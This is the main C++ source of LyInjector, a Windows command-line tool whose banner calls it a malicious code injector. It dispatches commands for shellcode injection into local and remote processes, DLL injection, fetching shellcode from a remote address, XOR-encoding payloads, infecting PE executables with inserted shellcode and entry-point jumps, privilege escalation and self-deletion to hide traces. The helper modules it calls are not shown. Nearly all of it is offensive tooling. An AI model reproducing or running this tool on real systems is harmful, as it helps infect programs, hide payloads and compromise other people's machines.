// LyInjector.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <stddef.h>
#pragma comment(lib,"Imagehlp.lib")
#pragma comment(lib, "WinInet.lib")

int _tmain(int argc, _TCHAR* argv[])
{
    if (argc == 1)
    {
        fprintf(stderr,
            " _            ___        _           _             \n"
            "| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n"
            "| |  | | | |  | || '_ \\ | |/ _ \\/ __| __/ _ \\| '__|\n"
            "| |__| |_| |  | || | | || |  __/ (__| || (_) | |   \n"
            "|_____\\__, | |___|_| |_|/ |\\___|\\___|\\__\\___/|_|   \n"
            "      |___/           |__/                         \n\n"
            "---------------------------------------------------------- \n"
            "[*] 应用层恶意代码注入器 \n"
            "[+] 版本: 2.0.0 \n"
            "[+] 联系作者: me@lyshark.com \n"
            "---------------------------------------------------------- \n\n"
            "  [+] 基础功能\n\n"
            "\t Show              显示当前所有可注入进程 \n"
            "\t ShowDll           显示进程内的所有DLL模块 \n"
            "\t Promote           尝试提升自身进程权限 \n"
            "\t FreeDll           尝试卸载指定进程内的DLL模块 \n"
            "\t GetFuncAddr       显示进程内特定模块内函数基址 \n"
            "\t Delself           从系统中删除自身痕迹 \n\n"

            "  [+] 格式化功能\n\n"
            "\t Format            将字节数组格式化为一行并打印 \n"
            "\t FormatFile        将字节数组格式化并写出到文件 \n"
            "\t Xor               将文本中压缩后的字节数组进行异或并输出 \n"
            "\t Xchg              将压缩后的字符串转为字节数组格式 \n"
            "\t XorArray          将字节数组加密/解密为字节数组格式 \n\n"

            "  [+] 进程注入功能\n\n"
            "\t InjectDLL         注入DLL模块到特定进程内 \n"
            "\t InjectSelfShell   注入字符串到自身进程并运行 \n"
            "\t InjectArrayByte   注入字节数组到自身进程并运行 \n"
            "\t FileInjectShell   从文件中读入字符串并注入运行 \n"
            "\t InjectProcShell   注入字符串到远程进程并运行 \n"
            "\t InjectWebShell    从远程加载字符串并注入自身进程 \n"
            "\t AddSection        在PE文件中新增一个节区 \n"
            "\t InsertShellCode   将ShellCode插入到PE中的指定位置处 \n"
            "\t RepairShellOep    在ShellCode末尾增加跳转回原处的指令 \n"
            "\t SetSigFlag        设置文件感染标志 \n\n"

            "  [+] 编码器\n\n"
            "\t EncodeInFile      从文件读入加密字符串并执行反弹 \n"
            "\t EncodePidInFile   注入加密后的字符串到远程进程中 \n\n"
            );
    }

    // -----------------------------------------------------------------------
    // 传递一个参数
    // -----------------------------------------------------------------------
    if (argc == 2)
    {
        // 输出当前进程列表
        // --show
        if (strcmp(argv[1], "Show") == 0)
        {
            ShellCodeInjectModule::EnumProcess();
        }
        // 提升自身权限
        if (strcmp(argv[1], "Promote") == 0)
        {
            if (ShellCodeInjectModule::IncreaseSelfAuthority() == FALSE)
            {
                printf("[-] 权限提升失败. \n");
            }
            else
            {
                printf("[*] 已提升. \n");
            }
        }
        // 删除自身进程
        if (strcmp(argv[1], "Delself") == 0)
        {
            if (ShellCodeInjectModule::SelfDel() == TRUE)
            {
                printf("[*] 自身已清除. \n");
            }
            else
            {
                printf("[-] 删除失败. \n");
            }
        }
    }

    // -----------------------------------------------------------------------
    // 传递三个参数
    // -----------------------------------------------------------------------
    if (argc == 4)
    {
        // 格式化为一行 Format --path d://shellcode.txt
        if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            ShellCodeInjectModule::Compressed(argv[3]);
        }
        // 注入到自身进程并运行 InjectSelfShell --shellcode 0fce8bec8844abec....
        if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
        {
            ShellCodeInjectModule::InjectSelfCode(argv[3]);
        }
        // 直接注入文件中的字节数组 InjectArrayByte --path d://shellcode.txt
        if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            ShellCodeInjectModule::CompressedOnFormat(argv[3]);
        }
        // 从文件中读入字符串并注入 FileInjectShell --path d://shellcode.txt
        if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            ShellCodeInjectModule::ReadShellCodeOnMemory(argv[3]);
        }

        // 显示当前进程中导入的所有DLL模块 ShowDll --proc x64.exe
        if (strcmp((char*)argv[1], "ShowDll") == 0 && strcmp((char*)argv[2], "--proc") == 0)
        {
            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
            if (pid != 0xFFFFFFFF)
            {
                printf("\n");
                DllInjectModule::ShowProcessDllName(pid);
            }
            else
            {
                printf("[+] 请指定一个正在运行的进程 \n");
                return 0;
            }
        }

        // 设置感染标志：SetSigFlag --path d://aaa.exe
        if (argc == 4)
        {
            if (strcmp((char*)argv[1], "SetSigFlag") == 0 && strcmp((char*)argv[2], "--path") == 0)
            {
                PEInjectModule::SetSigFlag(argv[3]);
            }
        }
    }

    // -----------------------------------------------------------------------
    // 传递五个参数
    // -----------------------------------------------------------------------
    if (argc == 6)
    {
        // 格式化保存为文件 FormatFile --path d://shellcode.txt --output d://encode.txt
        if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
        {
            ShellCodeInjectModule::CompressedToFile(argv[3], argv[5]);
        }
        // 异或加密/解密 Xor --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            ShellCodeInjectModule::XorShellCode(argv[3], argv[5]);
        }
        // 字符串转字节数组 Xchg --input d://encode.txt --output d://array.txt
        if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
        {
            ShellCodeInjectModule::XchgShellCode(argv[3], argv[5]);
        }
        // 字节数组加密为字节数组 XorArray --path d://array.txt --passwd lyshark
        if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            ShellCodeInjectModule::XorEncodeDeCode(argv[3], argv[5]);
        }

        // 将字符串注入到远程进程 InjectProcShell --pid 1021 --shellcode 0fce8bec8844abec....
        if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
        {
            ShellCodeInjectModule::InjectCode(atoi(argv[3]), argv[5]);
        }
        // 从远程加载并注入字符串 InjectWebShell --address 192.168.1.1 --payload shellcode.raw
        if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
        {
            ShellCodeInjectModule::WebPageBounceShellCode(argv[3], argv[5]);
        }
        // 加密反弹 EncodeInFile --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            ShellCodeInjectModule::ReadXorShellCodeOnMemory(argv[3], argv[5]);
        }

        // 注入DLL到指定进程 InjectDLL --proc x32.exe --dll d://test.dll
        if (strcmp((char*)argv[1], "InjectDLL") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
        {
            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
            if (pid != 0xFFFFFFFF)
            {
                BOOL flag = DllInjectModule::RemoteProcessInject(pid, argv[5]);
                if (flag == TRUE)
                {
                    printf("[*] 模块 [ %s ] 已被注入到 [ %d ] 进程 \n", argv[5], pid);
                }
                else
                {
                    printf("[-] 模块注入失败 \n");
                }
            }
            else
            {
                printf("[+] 请指定一个正在运行的进程 \n");
                return 0;
            }
        }

        // 卸载进程内的DLL模块
        if (strcmp((char*)argv[1], "FreeDll") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4],"--dll") == 0)
        {
            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
            if (pid != 0xFFFFFFFF)
            {
                printf("\n");
                BOOL ref = DllInjectModule::FreeProcessDll(pid, argv[5]);
                printf("[*] 模块卸载状态: %d \n", ref);

            }
            else
            {
                printf("[+] 请指定一个正在运行的进程 \n");
                return 0;
            }
        }
    }

    // -----------------------------------------------------------------------
    // 传递七个参数
    // -----------------------------------------------------------------------
    if (argc == 8)
    {
        // 加密反弹 InjectXorCode --pid 1022 --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6], "--passwd") == 0))
        {
            ShellCodeInjectModule::InjectXorCode(atoi(argv[3]), argv[5], argv[7]);
        }

        // 获取进程内导出函数地址 GetFuncAddr --proc x32.exe --dll user32.dll --func messagebox
        if (strcmp((char*)argv[1], "GetFuncAddr") == 0 && strcmp((char*)argv[2], "--proc") == 0 &&
            strcmp((char*)argv[4], "--dll") == 0 && strcmp((char*)argv[6], "--func") == 0
            )
        {
            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
            if (pid != 0xFFFFFFFF)
            {
                printf("\n");
                DllInjectModule::GetProcessDllFunctionAddress(pid, argv[5], argv[7]);
            }
            else
            {
                printf("[+] 请指定一个正在运行的进程 \n");
                return 0;
            }
        }

        // 在PE文件中新增一个节 Error
        // AddSection --path d://aaa.exe --section .hack --size 4096
        if (strcmp((char*)argv[1], "AddSection") == 0
            && strcmp((char*)argv[2], "--path") == 0
            && strcmp((char*)argv[4], "--section") == 0
            && strcmp((char*)argv[6], "--size") == 0
            )
        {
            PEInjectModule::ImplantSection(argv[3], argv[5], atoi(argv[7]));
            Sleep(1000);
            PEInjectModule::AllocateSpace(argv[3], atoi(argv[7]));
        }

        // 将ShellCode插入到PE中的指定位置
        // InsertShellCode --path d://aaa.exe --shellcode d://shellcode.txt --offset 7102
        if (strcmp((char*)argv[1], "InsertShellCode") == 0
            && strcmp((char*)argv[2], "--path") == 0
            && strcmp((char*)argv[4], "--shellcode") == 0
            && strcmp((char*)argv[6], "--offset") == 0
            )
        {
            PEInjectModule::WritePEShellCode(argv[3], atoi(argv[7]), argv[5]);
        }

        // 在ShellCode末尾增加跳转回原处的指令 Error
        // RepairShellOep --path d://aaa.exe --start_offset 28492 --end_offset 28498
        if (strcmp((char*)argv[1], "RepairShellOep") == 0
            && strcmp((char*)argv[2], "--path") == 0
            && strcmp((char*)argv[4], "--start_offset") == 0
            && strcmp((char*)argv[6], "--end_offset") == 0
            )
        {
            PEInjectModule::SetPeJmpHeader((char*)argv[3], atoi(argv[5]), atoi(argv[7]));
        }
    }
    return 0;
}
